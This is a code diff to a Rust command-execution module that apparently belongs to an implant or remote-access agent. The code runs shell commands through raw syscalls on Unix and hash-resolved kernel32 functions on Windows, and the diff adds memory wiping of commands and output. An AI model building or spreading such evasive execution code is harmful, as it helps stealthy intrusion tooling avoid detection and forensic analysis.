@@ -1,4 +1,6 @@
 use alloc::vec::Vec;
+use crate::utils::sensitive::SensitiveData;
+use zeroize::Zeroize;
 
 #[cfg(not(target_os = "windows"))]
 use crate::utils::syscalls::{sys_fork, sys_execve, sys_pipe, sys_dup2, sys_read, sys_close, sys_exit};
@@ -54,17 +56,17 @@ struct SECURITY_ATTRIBUTES {
 }
 
 impl Shell {
-    pub fn exec(&self, cmd: &str) -> Vec<u8> {
+    pub fn exec(&self, cmd: &str) -> SensitiveData {
         #[cfg(not(target_os = "windows"))]
         unsafe {
             let mut pipefd = [0i32; 2];
             if sys_pipe(pipefd.as_mut_ptr()) < 0 {
-                return Vec::from(b"Pipe failed");
+                return SensitiveData::new(b"Pipe failed");
             }
 
             let pid = sys_fork();
             if pid < 0 {
-                return Vec::from(b"Fork failed");
+                return SensitiveData::new(b"Fork failed");
             }
 
             if pid == 0 {
@@ -82,6 +84,7 @@ impl Shell {
                 let envp = [core::ptr::null()];
                 
                 sys_execve(sh.as_ptr(), argv.as_ptr(), envp.as_ptr());
+                cmd_c.zeroize(); // Only reached if execve fails
                 sys_exit(1);
             } else {
                 // Parent
@@ -94,7 +97,11 @@ impl Shell {
                     output.extend_from_slice(&buf[..n]);
                 }
                 sys_close(pipefd[0] as usize);
-                output
+                
+                let sensitive = SensitiveData::new(&output);
+                output.zeroize();
+                buf.zeroize();
+                sensitive
             }
         }
 
@@ -108,7 +115,7 @@ impl Shell {
             let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));
 
             if create_pipe.is_null() || create_process.is_null() || read_file.is_null() {
-                return Vec::from(b"Resolution failed");
+                return SensitiveData::new(b"Resolution failed");
             }
 
             type FnCreatePipe = unsafe extern "system" fn(*mut HANDLE, *mut HANDLE, *mut SECURITY_ATTRIBUTES, u32) -> i32;
@@ -127,7 +134,7 @@ impl Shell {
             let mut h_write: HANDLE = core::ptr::null_mut();
 
             if core::mem::transmute::<_, FnCreatePipe>(create_pipe)(&mut h_read, &mut h_write, &mut sa, 0) == 0 {
-                return Vec::from(b"Pipe creation failed");
+                return SensitiveData::new(b"Pipe creation failed");
             }
 
             // Ensure the read handle to the pipe for the child process is not inherited.
@@ -160,11 +167,13 @@ impl Shell {
                 &mut si,
                 &mut pi
             );
+            
+            cmd_mut.zeroize();
 
             if success == 0 {
                 core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_read);
                 core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_write);
-                return Vec::from(b"Process creation failed");
+                return SensitiveData::new(b"Process creation failed");
             }
 
             // Close the write end of the pipe before reading from the read end.
@@ -179,12 +188,16 @@ impl Shell {
                 }
                 output.extend_from_slice(&buf[..bytes_read as usize]);
             }
+            
+            buf.zeroize();
 
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(h_read);
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(pi.hProcess);
             core::mem::transmute::<_, FnCloseHandle>(close_handle)(pi.hThread);
 
-            output
+            let sensitive = SensitiveData::new(&output);
+            output.zeroize();
+            sensitive
         }
     }
 }
